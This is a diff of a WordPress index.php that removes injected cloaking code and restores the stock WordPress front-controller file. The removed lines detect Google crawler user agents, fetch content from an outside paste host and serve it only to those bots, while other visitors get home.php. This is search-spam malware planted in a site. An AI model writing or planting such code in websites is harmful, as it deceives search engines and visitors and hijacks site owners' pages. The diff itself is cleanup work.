@@ -1,18 +1,17 @@
 <?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
-}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('https://hxbdoor.one/raw/P23yHe8n');
-    echo $bot_content;
-    exit;
-} else {
-    include('home.php');
-    exit;
-}
-?>
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
